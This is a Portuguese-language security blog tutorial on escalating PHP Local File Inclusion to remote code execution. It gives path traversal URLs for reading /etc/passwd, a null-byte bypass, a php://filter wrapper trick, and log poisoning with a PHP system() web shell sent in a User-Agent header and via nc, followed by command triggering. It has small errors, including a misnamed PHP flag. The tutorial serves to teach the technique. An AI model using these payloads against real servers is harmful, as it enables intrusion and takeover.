---
title: <Article> From LFI to RCE <pt-br>
published: true
author: EEP0x10
date: '2020-01-21'
categories:
  - SecInfo
tags:
  - CWE
  - Article
---
Local File Include é um termo usado para casos onde vulnerabilidade File Inclusion [CWE-98]([https://cwe.mitre.org/data/definitions/98.html](https://cwe.mitre.org/data/definitions/98.html)) ocorre em um cenário específico, onde o download de arquivos remotos está desabilitado, assim necessitando explorar essa falha de outra forma, enviado um arquivo localmente via alguma funcionalidade de upload dentro da aplicação ou por meio de parâmetros que não tratam corretamente a entrada de dados.

Além do upload de arquivos, permite-se encadear com a vulnerabilidade Path Transversal [CWE-23]([https://cwe.mitre.org/data/definitions/23.html](https://cwe.mitre.org/data/definitions/23.html)), que seria o acesso a qualquer arquivo dentro do servidor (como arquivos de senhas ou logs) ou arquivos enviados com códigos maliciosos, que após acessa-los, são executados dentro do servidor.

> Normalmente o código malicioso enviado é um parâmetro que informa um comando que é executado posteriormente pelo servidor, levando a um RCE.

![Mitre](https://cwe.mitre.org/images/mitre_logo.gif){: width="240" class="right"}

Para que ocorra essa vulnerabilidade, 2 flags no PHP devem estar ligadas.

- `allow_url_fopen` ON
- `allow_irl_include` ON

![https://gblobscdn.gitbook.com/assets%2F-M5_2lo947LgQdhZx3lm%2F-MMjidzzNcdFWd7HSnEj%2F-MMjizb36lER4iDhdjPu%2Fimage.png?alt=media&token=27674d79-4041-4681-adc1-0338ae6a9866](https://gblobscdn.gitbook.com/assets%2F-M5_2lo947LgQdhZx3lm%2F-MMjidzzNcdFWd7HSnEj%2F-MMjizb36lER4iDhdjPu%2Fimage.png?alt=media&token=27674d79-4041-4681-adc1-0338ae6a9866)

> Arquivo <?php phpinfo();?>

# Exploração

A primeira etapa é tentar reproduzir a vulnerabilidade Path Transversal, e para isso ***é preciso tentar entender como o código da aplicação funciona***.

Nos exemplos abaixo, considere um site de floricultura, onde por meio da alteração do parâmetro `view`, ele retorna ou catálogo diferente da loja.

> O site exemplo é feito em PHP, Mysql, Apache2 e o servidor é Ubuntu Server

### Visão inicial

`http://teste.com/?view=flores`

Possível código

```php
if isset($_GET['view']){
    include($_GET['view'])
}
```

Validações:

- Mudar o valor do parâmetro para apontar para um arquivo interno (como /etc/passwd em linux)

`http://teste.com/?view=../../../../etc/passwd`

Caso retorno um erro "`arquivo não encontrado`", pode-se supor que o código seja:

```php
if isset($_GET['view']){
    include($_GET['view'] . 'php')
}
```

Provavelmente a aplicação está auto completando no valor informado no parâmetro `view` com a extensão `.php`, portanto será necessário passar um `NULL BYTE` no final, para realizar um bypass da extensão, ignorando tudo que vier após o endereço do arquivo.

`http://teste.com/?view=../../../../etc/passwd%00`

![IMG](https://www.aptive.co.uk/wp-content/uploads/2017/02/lfi-example-etc-passwd.png)

Caso  retorne um erro no PHP, será necessário passar o conteúdo em base64 via [PHP Wrappers]([https://www.php.net/manual/pt_BR/wrappers.php](https://www.php.net/manual/pt_BR/wrappers.php))

"`‌</b>: Cannot redeclare containsStr() (previously declared in /var/www/html/index.php:17) in <b>/var/www/html/index.php</b>`"

`http://teste.com/?view=php://filter/convert.base64-encode/resource=../../../../etc/passwd`

![IMG2](https://img.wonderhowto.com/img/55/68/63694277579296/0/beat-lfi-restrictions-with-advanced-techniques.w1456.jpg)

> O retorno será todo em base64, portando será necessário descriptografar
Um bom site é o [Base64 Decode]([https://www.base64decode.org/](https://www.base64decode.org/))

# LFI to RCE via Logs Infection‌

Para evoluir de um Path Transversal para um RCE é simples, basta envia uma função `system`  com um parâmetro para os logs do sistema, e  definir um valor do mesmo. 

> O mesmo deve ser enviado nos logs para que se tenha o retorno do comando executado.

> Lembrando que o arquivo de log deve ter permissão de leitura e escrita 
(R W _)

Enviar parâmetro via HEADER ou via nc:

```html
GET / HTTP/1.1
Host: 10.10.100.11
User-Agent: <?php system($_GET['cmd']) ; ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

```bash
nc -v 10.10.10.10 80 -C 

<?php system($_GET['cmd']) ; ?>
```

### Logs Apache2:

- /var/log/apache/access.log
- /var/log/apache/error.log
- /var/log/vsftpd.log
- /var/log/sshd.log
- /var/log/mail
- /proc/self/environ
- /proc/self/fd

### Logs do SSH

> [https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/](https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/)

### Via /proc/self/environ

> [https://null-byte.wonderhowto.com/how-to/beat-lfi-restrictions-with-advanced-techniques-0198048/](https://null-byte.wonderhowto.com/how-to/beat-lfi-restrictions-with-advanced-techniques-0198048/)

Depois basta executar o comando via Browser ou Curl 

`curl http://adress -d 'parametro=comando'`
ou
`http://teste.com/?view=php://filter/convert.base64-encode/resource=../../../..//var/log/apache/access.log&cmd=COMANDO`

![dog](https://miro.medium.com/max/700/1*xeRBVK28Z2H6UVajZyQtsg.png)

A partir desse ponto, basta executar um comando de reverse shell :)

![IMG3](https://media.makeameme.org/created/rce-rce-everywhere.jpg)
